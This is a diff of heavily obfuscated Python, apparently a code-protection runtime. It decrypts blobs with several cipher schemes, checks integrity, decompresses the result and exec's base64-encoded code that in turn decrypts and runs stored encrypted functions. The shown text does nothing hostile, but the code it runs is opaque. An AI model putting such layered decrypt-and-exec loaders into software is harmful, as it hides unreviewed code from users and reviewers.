-            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
-        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.CTR(_tahji))
-        _pnic = _zqjve.decryptor().update(_upqxtn)
-    elif _dw == 3:
-        try:
-            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _sehx
-        except ImportError:
-            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _pnic = _zviy[16:-32]
-        _upqxtn = _pnic[:-16]; _ij = _pnic[-16:]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=76)
-        _tlaujy = _ouq[:32]; _tahji = _ouq[32:44]; _nekgcd = _ouq[44:76]
-        _lchxbfa = _nkwl.new(_nekgcd, _pnic, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _pnic = _sehx(_tlaujy).decrypt(_tahji, _upqxtn + _ij, None)
-    elif _dw == 11:
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
-        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _ij = _tlaujy[0]
-        _pnic = bytearray()
-        for _cugo in range(len(_upqxtn)):
-            _buogn = _upqxtn[_cugo] ^ _ij
-            _pnic.append(_buogn)
-            _ij = _upqxtn[_cugo] ^ _tlaujy[ (_cugo + 1) % len(_tlaujy) ]
-            _ij = (((_ij << 3) & 0xFF) | (_ij >> 5)) ^ 0x5A
-        _pnic = bytes(_pnic)
-    elif _dw == 8:
-        _wwngh = ('0','1','2','3','4','5','6','7','8','9',
+            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
+        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.ECB())
+        _wrelk = _vaxfkla.decryptor()
+        _wrelk = _wrelk.update(_sjuwwke) + _wrelk.finalize()
+        _ordocues = _wrelk[-1]
+        if _ordocues < 1 or _ordocues > 16 or not all(_ == _ordocues for _ in _wrelk[-_ordocues:]):
+            _jwfcgd.stderr.write("error: decryption failed\n"); _jwfcgd.exit(1)
+        _wrelk = _wrelk[:-_ordocues]
+    elif _padllgc == 12:
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
+        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _ordocues = 3 + (_ldntjew[0] & 7)
+        _ldntjew = bytearray(_sjuwwke)
+        for _ausrt in range(_ordocues - 1, -1, -1):
+            _drzocix = (3 + _ausrt) & 7
+            _hizqhxz = (_ausrt * 0x1B + 0x5A) & 0xFF
+            for _mtejroptc in range(len(_ldntjew)):
+                _ordocues = _ldntjew[_mtejroptc]
+                _ordocues ^= _hizqhxz
+                _ordocues = ((_ordocues >> _drzocix) | ((_ordocues << (8 - _drzocix)) & 0xFF))
+                _ordocues ^= _konvuj[(_ausrt * len(_ldntjew) + _mtejroptc) % len(_konvuj)]
+                _ldntjew[_mtejroptc] = _ordocues
+        _wrelk = bytes(_ldntjew)
+    elif _padllgc == 6:
+        _wrelk = _uxujbpzjd.b64decode(_dmpfr)
+    elif _padllgc == 8:
+        _kpqdt = ('0','1','2','3','4','5','6','7','8','9',
                 'A','B','C','D','E','F','G','H','I','J','K','L','M',
                 'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                 'a','b','c','d','e','f','g','h','i','j','k','l','m',
                 'n','o','p','q','r','s','t','u','v','w','x','y','z',
                 '!','#','$','%','&','(',')','*','+','-',';','<','=',
                 '>','?','@','^','_','`','{','|','}','~')
-        _yz = {c:i for i,c in enumerate(_wwngh)}
-        def _iwux(_qikna):
-            _oah = bytearray(); _bkn = 0
-            while _bkn < len(_qikna):
-                _sbioxxv = 0; _vv = 0
-                while _bkn < len(_qikna) and _vv < 5:
-                    _sbioxxv = _sbioxxv * 85 + _yz[chr(_qikna[_bkn])]; _bkn += 1; _vv += 1
-                _afgu = _vv - 1
-                if _afgu > 0: _oah.extend(_sbioxxv.to_bytes(4, 'big')[4-_afgu:])
-            return bytes(_oah)
-        _pnic = _iwux(_zviy)
+        _fwbdrrpzq = {c:i for i,c in enumerate(_kpqdt)}
+        def _xsfaq(_yrkylcrgh):
+            _yzgtpn = bytearray(); _rtjkkid = 0
+            while _rtjkkid < len(_yrkylcrgh):
+                _hxhkojih = 0; _ivvzdeebe = 0
+                while _rtjkkid < len(_yrkylcrgh) and _ivvzdeebe < 5:
+                    _hxhkojih = _hxhkojih * 85 + _fwbdrrpzq[chr(_yrkylcrgh[_rtjkkid])]; _rtjkkid += 1; _ivvzdeebe += 1
+                _utammtvze = _ivvzdeebe - 1
+                if _utammtvze > 0: _yzgtpn.extend(_hxhkojih.to_bytes(4, 'big')[4-_utammtvze:])
+            return bytes(_yzgtpn)
+        _wrelk = _xsfaq(_dmpfr)
     else:
-        _alqld.stderr.write("error: unsupported algorithm\n"); _alqld.exit(1)
-    _vk = bytes.fromhex("4e2fcda0e9bf9569b446704242e70f965003f436de1abc75fa2e89acf3fd3985")
-    _vn = bytes.fromhex("c27c32ecaaf470f4a884cc80068eadf9")
-    _sig = _pnic[-32:]
-    _pl = _pnic[4:-32]
+        _jwfcgd.stderr.write("error: unsupported algorithm\n"); _jwfcgd.exit(1)
+    _vk = bytes.fromhex("6f3fb079f1971799500c54b60ac47af2b7d3af930d6fc0a3a1abd9e9e92f69b3")
+    _vn = bytes.fromhex("8d45f3c0c991f69d426624a9eacd01d5")
+    _sig = _wrelk[-32:]
+    _pl = _wrelk[4:-32]
     import hmac, hashlib
     if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
-        _alqld.stderr.write('error: VM integrity check failed\n'); _alqld.exit(1)
-        _alqld.stderr.write('error: VM integrity check failed\n'); _alqld.exit(1)
+        _jwfcgd.stderr.write('error: VM integrity check failed\n'); _jwfcgd.exit(1)
     _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
+    if _wrelk[1] == 1:
+        import zlib as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 2:
+        import lzma as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 3:
+        import bz2 as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 4:
+        import brotli as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 5:
+        import zstandard as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 6:
+        import gzip as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 7:
+        import lz4.frame as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 8:
+        import snappy as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 9:
+        import gzip as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    elif _wrelk[1] == 10:
+        import blosc as _dolhi
+        _pd = _dolhi.decompress(_pd)
+    else:
+        pass
     _c, _k, _m, _map, _ok = _vm_deserialize(_pd)
-    exec(compile(_hi.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdRODduV1RhNkF2aGVrQ2lGQmJBYlAwQzRkN0JTc1gzWHE1dmVyUnlpQUhZPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnWHJmUitldzFjMFUwVktVNXdlOHRldmh6eFMvdVI1UFVPOWNKQUVaZHI2amd2eEc3NSs2MkMyQ0x1MG8wcmViOGk1alZrVVhobnJ0Vi8vcTJHdDJvcFJWVitlTGZhbStpYi9MejdKMnZWcTlWZzRvZGRLQUQ3dFRpK1JlVEtVRCtoWld6bndvREpDc1daMTUvMUo2WmhtVFVMa0I2M3NOdlJzeSsrUEUvWjM1cGhoZ3QzUmxYNldxVkhXWkZ0QnVOa0QySFZPNFdlSWZUc0pOUmlPTVlYbzRtL1BUdVpUUFRVY3VkK0p1SlBkMlh2ei9ERjByVVR0eXdRUm9OdW93ZXNEWURMSU1PekZqQ1ZzUXB3TzZ6eEtBWGpOR1ZpUEhiM1ZGUGpQcnJYWXlmQW13Z0pVUmwwR3ZmV3lqd1pXNmxQRjZiS0htdDV0enBOcENFbnM3VjZqNzh6azErTlhxRkljWitsY1pJZmt1ckdzdnZJMzRxeHZzUlE1TkUwUzlaeHpiVTloM3NWRXlYZGV2VlRTMEpKOXZ3UGNSclZkcWhyZDVaUGM5OXd4bGx3N093NlFnbUhtZndlaXBHMC9CdWlpUDZvSUtEWmdyMERoK2JEa3RqeUZNdm50SzFpN1JkVGJQZWZxb0pDVTNYZVlnSXE3WVg4a0ZTZkw2eHY4MEtMV29JMUd3ODQvZkNSM0lCTlVtbXdBemZCYVBWY1hZZWxvOWgxKzc2T2VDMThtamhiSXZBNzF3M2t3WW9xZ0JRdFJyOGF3Z2Fycmc1Mm04TEtxbUxNL1QwdUtQUHpCb21PQ2d1Y2VaUGJYYUd3Q0JQTk1kTS9pTE5XRzN3RXZSM3llMmE0azlZZFBIcTQ5UHZLL1UzQUNVWGtnTHpycWg0MXF6bDY1czFJR2VoSHdMdThmNXBwRVNnNUFjY1VGcXVNeG5rVmZwckgvWE1DeklEUDAzSlN0QzVzclNzSTJJc3RLM2ZWbGtvczZnNjRiQ2lWTkVCcUNmZjBDWUtBNDBEQklNVHJ2T1E0QkZwcWxYR3U2cXFjTVVsUWl0NzU3dUZHY1o5dFRzQkE5ditNb25peWJCTm1CTEZNOXVhT0RicHJxQUQzREU0RTlwOUtMRkR5Vk9hMGFzNzZHeStsdnFyWnZMY0VPYi9xNWZ5OUxJWms3TDBYYWhEcURFV2pERVpMSERWYnVZdDNaQkVQTk5yajN4Qk5zTnM3alVNbTk5RWppUHI4YllQMGUyKzd3S0hiSGcyRTlOU0lLM2h3aVhoWDNMWndIM21KaUJHU3FEcWZ3OElEV0Y0VE5oaDN4TWxGTEtHU0UzeWltUVdVMlJMSytIQi9yOHJoSnJpZTU0N1F2c3ErdmFKbmJ6Rmg2dFhSSDEwdGZCZVo2WmQ5THdIQ0dEQUc3bmRjS2Vya0EwNytrYXhZTno0MHRoZndadWFkd0g4S1UrNysxU0JJVmxmckhzb3FGV2k3UllxRGxYRzNpWU9TbnNvTFEzVVVSRVFrdVFoUDJ2S1VHWjhNdzdsRnlmZW9kYzFtWHVaS1lOdHNLazJnb1d2d0lKa2tPVEhhSU1rWWhVUUJsKzlQNHRBa2QwKytmQms5a0lxaGt2eFkyNU9SWFRTVW1QdUN2QXRieFRqV0h0UDZkY29WajliclRsNEw5cHN3VERwc3RWNXpRWG5wdHJSdk9kZjc3bnpQYkJJVTkyWUhJSGNHVWV6OTUwZVdaalg2WC9LWWhndi9nNUNqWjhxSFhRczh5RzNlMVo3WXNnMkNGN08yNGpTZi93WTFIUXUzMEZnSmdnZW42WTl3QWgvSGtVcTVieGpXVTIzeS8xbVFPZy9jVjZZWWZmcWZyVnNFV0FnSnduL3p5NHV3VXJDTWYrWkpsTHZvRVpQRjZwRWxxY0dzYlhESW5qeEV5ZXh5Uk1JQVgxcjZrM0trNVoyVlE1NEY1UzZHMHBjWkJ3Vytpc2NWMytmb1BpTmg1T2Z6ciswWGYzL1QxYUN0aU9xWXJSdUhvSDQ3M29WVUlRMU9CK2VFZlZ5akg4WUNhc0lncS9LSUZOdHhvYlBWS0t5TkFwVzZybG9aZ1VjZ2h4OEFGczc2bU5CcktjMGMzRnlDWDM4K1YyckIrTW1wL0pnZ0ZWTWROTXVXSTNYWUpMY1drTW9OSVRmdDNaSHdFZWVFbUtHcFlsMmp1SXRIb092R2FBSU5yL2dlMmxza3pFeStmMVBqQUhnNjB4aTUvWnlCUXRTNjZvaWcyRE9BVVhoM0NMY2xkd0s3c09yTUJGQjJSK1RsOFNMRVdDTWhEVlJYZTBPU1hpb21GSS9ZdXlJdVJ6K1RncHhQdUp5MlRuYml3SnVSTW9vRm5IWDVrN2phQXF2Q251VHN3NUhWS1NlZGpTaFppREdGdmNIc093ejA1UkFFS1VubmxLblowSHBQaTRxQ29CYlk4TlFHSENWbW1WWXhkZEx2YytWYWlBcjNxbnprNkl1eXdsYTY2OVZOcCs3UVcySHJvWHFIdWdzWjZPSzdlYWtSaitXQXNYdnVDMlVDSStITkFtdDBUbXZQT211NC8zVnRQSzJ1alVzOGFjWHMyUWVGYVZieEpwdlhuTzhUWFl2K3Y2OW9DV2s3ZkR3QjFhMmUyM3g1Nmg5cDRPNDl5OUxqRmxSOFpTam1nNE9tVjQzMytIZnd3PT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnSk5iR3JINGZYREhyeENIVTRNdGlZbTQ1cXpRd0w5OFNOL0cwWFhmWDdGV3BGbzBnRlBsN2FIV1Zlb1JUN0ZObU9DU3MvQjZJYkJmSFphdlZEUkxCOFFMRnVpMzN3TjVTUnVBd2VQOUdvczNabFdpUnA5ZWtFbXFJQ2hZNVJTT3NCZjRjczJaaWkvYjNpSkFKTEZHRDRjbGRraGd2dUZLYU94MVppZll5VngwcXBuVFZwdzRMOURCYTNxY25iZGlqY0pHOUkzT1RzYkNvTi9jWEE4U2ZVczFnSi9sc2VqNGQraTlrQjV5TGJzdGF5OFBmZElOZDRhS1Z0RUVGMHdDWDViTDZUUXJaWmZ5MkZjQlNEZXRRWThTZUFlcEJ2dWlMNllwQnQ4d2dFSDZESjExdWdRZnN6Q3BUK01LTWxjajgzV3hpbFNCdzBmdjBGdm9VbjRnZjRGV2pxR3hReHN1UTBHd1RFQi9mY3krckRNTlB3VUt4SU9ldm9vak92MjJXcjJQcU5sRjRLeDN2aEdmMHRQdFpiNzNocVVhSThkODBVSkdvM1pTS0xlazlyS3AyVlBZak1hejc5aFR4UDA3UHJ2QVJxR1JrdU5HV3pZUjloZGRBMjVNOU90RGpOV0FnakNBSmZlbGdSdCtyOWkxeUZjZk83S1lHc3F5L3hyRzRjeFJPUGxZTFVremo3ekNBVTdteVpyTG83QVQ1Yjd4ZkNGMTF2TGM5MTlVVG0wWUNKdnluN3ZMWG5aTzRGbXZLekVvWUNZMEpzdFVCRklGWm9iaXEreml6a2dWaTFLTG1ZZVpRY2x5NWg4dUl5NWVSelVHSmNnbm42d2NmRlJPZXpXZjc4Y2ZreGQ4bkZWTFNYSXp4RzJ1UG1VSm1IUXRvQXEvSDVOdm1vOTJaQ1lObmhweU1ZaWZJcVQvSE05dGVNMzJDR1JNckJmdG94dEp2cmtjNTVRbkRBY0NWSUl3Ty9EaE9pUjJmV28wUk5FZFVlUTVONm9CUWU4Y21DemV0Qk9xRElaRkgyb1ltci9FSFNiMWRHN1lsR1FrV0N0SHBxOEVnM1ljdzFzQ2VsSTBPb1hXZEkzUjBtZDcxSzB5TVMvVFNqYWtRRjNZMmFoYjgzVFVVUVpGelFWK1JVb1Z6TUJHS3dSZkNIRlhhNUZTczZUZFJnd0RBQ3FiQ2dmdytkNnpsS3lWYkxINEhHTTFWTGhvYXNJTWtyMjRWeXhvQk1DeUFuSVE1YXgwMEowOEVESGFYNm5uVEdpWXlkcFJnL3UrbWtWNURXWjJPQ0t4MEk1MUtJNnNtOE93bmNQbVhWbE15NFlRT0xqUFduRTR0bTdxMkxJRUZhTzBZR2Z3TGE4VmNuSkpSMkd0RmU2TVBwbmZyZWFZZlNTU28rNlg2b1YzeXhtZER2ak9iOW1rVURnWnRjcnVZV05jUWxaU2ZrUk55UjIyQ1pHYUtiR0g1aG9PejZQVHk2NlNUM096UzFuMjRwVGpWV2pDeWF5VGlaS2FxNDJodVBjeU5ScnNTT1ljZjRISFEyZGZiVXZMTDBLZnFKcDRRSHdmbXZ4OHdibm5qZ1IwaUJscHVaUnVDSkQ1Lzhtb0c5V09VdHUrbmxGSkZFRDk1d2QyN2I3cmNabEQ5NSs0SFAwMC9qNHdsL3dYR21RTGozRTBwVFd0Q1d2SEhVZ1l4VVlZZXdUaVFKUXlJNS9MbVFyM0I5NHQrak9CazdVcHRiUEl4ZkZjSGgzYW1BeForKy9PUU8vV3owYVBaR3VpT3JMRStEdmRGU2NxbjQrQ2pzeWxRbmNVc1FxYU12Z04vaC9NT3BBbHVqaEE4TnNuZlZOODBONVN6SUxXMS9aMVZ4UHFVUE9acEZhVDl5ai84eVplcTRzRkpraHhkN1Nuc2paZWRTRERUYU5ldEdHa0x3TVB3d1hIaDV2MVU2WW1ZMUFEQU1kNWJDRWV3d2JKQWd5RGFSdWdoU2IvTmZmNVQzOGxkKy9kM2MxNHpnVjdPQ3QzUWlwYklEb1puN2dTTkY4WENEajU1Rm1TdjRQN216U2w4anltWnZ1bVAwUU9lK045MVlhdzdONTV1UTd5dzNuWmhxY2tOK3AvQ3pXbGp4bDRzRzlwNXJiL3Q2WSthK1dtbmRDVERFbmwwSU5DdnZsQzlBczdKV25sTDBVZTVxTXdTS1dOY3Rvay8zTWpESWVYSmoxb0NqQmdxRnZOd1lkMTRzUnRxVEFQVUlQTk0zNEVUMGpjbjdJOStnMFl3eFZWaHpVaWRCeFVSTFJVUnNJMy9sczZ5NWFXdVpMUWwzZ01mQnFRN0V0LzVGNkFnTE5uZ1k5VmZ5TjdHNHpsQmtNalhxSllMaUhSNjVsaEdTV0Y5T1N3ZUZLSHAvZ3lTUUNCc3o0UWNIeThjckxWbzR2QTVCZVI0OFhnM0R5aW5KdVhwblo1ZWl6MlZ1R05wUDZ6Qmk1YnpTWlZKRDIreTlxU091S0Myb0xnQ2h1RjJlRjdVVGRuUkdNOXl3dGRJM2hiWUJlbUE1ZVhnU2psYUUra2ZjOC9meVZjS1hoL3FNVEdSK2pRTlh3QnFua2pBRG54Vk9vZHhLWW5mZE9YbkdKV3I0VDJVbDA1ajRCK1BQNjBzNkNleU9xSHZCdkcvN3hHdjhmVEVRKzVUUW9vdC9qOFpveHZiYWpvc2o4dEwnKSwgYmFzZTY0LmI2NGRlY29kZSgnRkpvUC9teURaUVRFS1ljZkNXVWh3Q2JoZnhKeFIzMy9jb3R3K1ZucktDN3dsNEhDSkMreUhwTlIxQzZaeFhYc1FhS3FSd2xKajF2TEJYdzc5UWlVRGRwVTNYMlhTbFdHMWV1bUlZeGg5ODV2aU1KMmpBdVhyWWxyODFodmwwNGN3OEFheXJJY2s0OUt2ckIzRjJiZE95K0NGTGEwcWZMZm9FYjU2M2N2WDJFU1dzTHYyNnl0MnpUVjIrd1hCRHF1L3BqNkdLbXI5Q2V3ZnJvenlkandnWllETUoxUjNTTEQrOGtJYy9rWnFSSW4wR3lHSXBwb1RVYURwanZVR1RTaG9OMFI1U1lOeGpYVGllOHVOaGloOCtRM2JCVndLMWtqaVFJNkt0d0lvV3NudTFLKzUwcDAvQ3lzWGFLSHNTUmtEOEZYV2tXNldiUW9JSjloMUJWUU9RYUgycGo5WDBZL3RRTEdDbDMxT25vTW45dzl4NVVDR3QyNHhQMkZMbkpTbXltOFYxTkRuUkZ0WnNiYXlQSHMrZzBiMXlKSjBuWDIrbTVVbmRjVnNYS0ttOEY1NjBZcTN2N2JRQnk3TXJCa0Zjb21wZjY0YXQ2aStkOEtpWFhSTWFpR2p3U1llU2tlZzhlVjMvZVJpRE5MNnQvR1ZQUEVBdUlML3pwVEpUT3BKampwRXhkZU5wZVBrZ0JZUHRWRnJVQVNlbzhLVEFKdkt4T3d2YVMxeWxrZTZSWEFSL1dLa3gxR0xqMjl2MHJRa1Z6NE1KQU5oVTFGd1FTazM3SHBNMk52NCt4OEwza3hiMlJ1MllNQVU1WVRqVnlPaUh6Wm95VFJQZ1Y4amx4Ui92Nzl2c0lKY1FlMFN6SGxERGlwUUtTUHF3NUxYYkh5WmZ0bTdkR3RsTFNPRWxpNHpXRnlURjNCU0p3NlRwR2ZrTXpsVHZnZ2VxWDlZM0VxMEtSWSt4WFJLMEVWWlNWVXNpaGlLL1VuWDFCdTZmY090NE8yT0RKS2xucEJVNzcyS2ttaGlTVVppMEJxSWZQbTJUbG1YVmF4ZXdrME03RnBVM3lJUjQ5bnlLZG1wK0xaTm9MT055akhBc0hvdzZZU245bkM3WWdSY0dxRXpLSlEzcTdQTlZWSk9nWW84UDg4b3ZNMGtUNHgrQWVxUTFxUCtKU0k5ZmNQUVU5dzNnQzNqejNta0NQeTZYMGFzb042eFFqS2VSTWZyMWhRUE81S3BZYXpNUlZvTGFYa0hya09ieEpObzlNaWFnVXZhSVBsdzNxUFFqaWlaVFB3OWZpZ3NpQWowWGhXNncxTWNHakFHNWNtaVlmS2RIR0IrS1dhTWtpNk81SE01TmFqYzJsZlZ0U1ZHZER6OS9paWhndGkycUhJZUE1NW1oczlkRzdMMHpacko4S0xLUGRrdFR5c1BnNnFNRFdnUnNwWWdXU2NUUkFLaHcyVlRJVUFLYlA0UjBURm5rQlNlam41MDBBSWVZWEllclVTMXpkQkZBOUhJWjdpUXNMcjlTWUxSSmxDb08weStTbkt4dE5DZlhKeXljc0pORFg4ems3b1BGZ1kyRERZVVZza2IrMmdYTDlHRVkyWDdSSWZXc01zYjBqc3VzK1VYVjFQMWVzUkF5TTRFM3d4K3NVbmhLWGZXMTIzU1Y0bVJOdy9qMWZ5ZjVQL0s5OXV0RkhOUE5pWHAxc0ZJTzBpcURtL3dFRTJFK1BQcVhmdGpVMmx1ZjAxOFF6L2paL08xN1JtVjZpTHB5bU9Md0Fjd1VrMkJGaTJHb3YvNDBEN3lxM3h0WVVDZ1FxMGVmSHNwR3ZGdzZUL2dpRkhIand6K25EazJLTFd1RlVTUWlQTFBMcDlOQVFWRm1IYkg2Y2xTVFlhWHpTQWNKWU9zcExHaTdQTjFLK2lRKytNbEY5T1ZFbWZ0Rmk2MUNaR3dTK1BQcUNvZ0VIdGRTU2IrckNlM1hvRjUxNG9ROFRiam1jbHNCQjZGRC82SnMrMCtGSTVrblFOUGdPOVRhRkZEbmdjYjR0MkdlT2RlNGhnV0dMTEM5R3FIY2oyUkRCVnJZUXFoc0hJT0xTNW56RVV0SnBENkFHK1U1aGhaYzdMRUZOYkVSNXZCNHcxUmNSR1gxRHoyVjR0YlZkQUlHd0dhK2w4U1d2czgwbzZvMzVCYytHSnJtWWJ6QzQveitPbkthK2RQYmlpTVdkQnFhMldqQmZmWnVQVUl2eU5MbnQ0bHVrdHRsZDY4MVBHNW1ZeTVkRFJndGdlT3gvUi9RY3ZZWGZ4UWl4Rk0vd1Frc1hpRjl4VFhqMmg1UjRTZnNwcERjK0d0SGNqNHUzTzNLcXVhVWlXQlRCN2dQc25ZZ1F6aTFnM0hjTUFBaDRBektuRFVpQmM3cXhSNmtlZGQ1dUpHWlptUDhKcHhNY2pwdUxNN2lvS3F4U2dkMXErUFNXbzlkZWdBY0FySEhaRXBFOUNnVE1xY3p3TGJ6bXN1Q2VCRVh6T2pMV3I5L2hBbldGSUsxU2RWZjJFMkNWRVI5N1VlMlFrdlZiV2EwZTlFelBlUll0ZnIzc3M5bmYycHhRTnhUcWprRUlmb1VDbno2ZEhVN3ljenN6ME9GVHp4V1lPRVBvRVB2NXY3U1M0OVV0ZXJlQzl6WkliYXdndVY3Mi9rMEU1Wi8wRURmQXVGNU5JTEFtVkprMD0nKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuY